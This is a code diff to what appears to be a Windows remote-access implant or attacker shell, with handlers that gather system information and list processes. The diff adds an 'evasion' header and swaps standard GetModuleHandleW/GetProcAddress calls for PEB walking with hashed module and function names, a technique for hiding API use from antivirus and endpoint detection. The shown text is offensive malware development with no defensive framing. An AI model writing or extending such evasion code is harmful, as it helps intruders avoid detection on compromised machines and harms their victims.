@@ -18,6 +18,7 @@
  */
 
 #include "shell_internal.h"
+#include "../evasion/peb_walk.h"
 
 #include <Windows.h>
 #include <winternl.h>
@@ -45,9 +46,9 @@ void _handle_sysinfo(TLS_CONTEXT *pTls)
     OSVERSIONINFOEXW osvi = {0};
     osvi.dwOSVersionInfoSize = sizeof(osvi);
     typedef NTSTATUS (WINAPI *RtlGetVersion_t)(PRTL_OSVERSIONINFOW);
-    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
+    PVOID hNtdll_ = peb_get_module(peb_hash_str("ntdll.dll"));
     RtlGetVersion_t pRtlGetVersion =
-        (RtlGetVersion_t)(hNtdll ? GetProcAddress(hNtdll, "RtlGetVersion") : NULL);
+        (RtlGetVersion_t)(hNtdll_ ? peb_get_export(hNtdll_, peb_hash_str("RtlGetVersion")) : NULL);
     if (pRtlGetVersion)
         pRtlGetVersion((PRTL_OSVERSIONINFOW)&osvi);
 
@@ -79,9 +80,9 @@ void _handle_os_info(TLS_CONTEXT *pTls)
     OSVERSIONINFOEXW osvi = {0};
     osvi.dwOSVersionInfoSize = sizeof(osvi);
     typedef NTSTATUS (WINAPI *RtlGetVersion_t)(PRTL_OSVERSIONINFOW);
-    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
+    PVOID hNtdll2_ = peb_get_module(peb_hash_str("ntdll.dll"));
     RtlGetVersion_t pRtlGetVersion =
-        (RtlGetVersion_t)(hNtdll ? GetProcAddress(hNtdll, "RtlGetVersion") : NULL);
+        (RtlGetVersion_t)(hNtdll2_ ? peb_get_export(hNtdll2_, peb_hash_str("RtlGetVersion")) : NULL);
     if (pRtlGetVersion)
         pRtlGetVersion((PRTL_OSVERSIONINFOW)&osvi);
 
@@ -304,10 +305,11 @@ void _handle_ps(TLS_CONTEXT *pTls)
                 arch = "?";
             }
 
-            /* Convert wide process name to narrow for the ASCII output buffer */
+            /* Under -DUNICODE, PROCESSENTRY32 == PROCESSENTRY32W and
+               szExeFile is WCHAR[]. Convert to UTF-8 for the output buffer. */
             char exeName[MAX_PATH] = {0};
-            WideCharToMultiByte(CP_UTF8, 0, pe.szExeFile, -1,
-                                exeName, sizeof(exeName) - 1, NULL, NULL);
+            WideCharToMultiByte(CP_UTF8, 0, (LPCWCH)pe.szExeFile, -1,
+                                exeName, (int)sizeof(exeName) - 1, NULL, NULL);
 
             char line[512];
             int lineLen = _snprintf(line, sizeof(line) - 1,
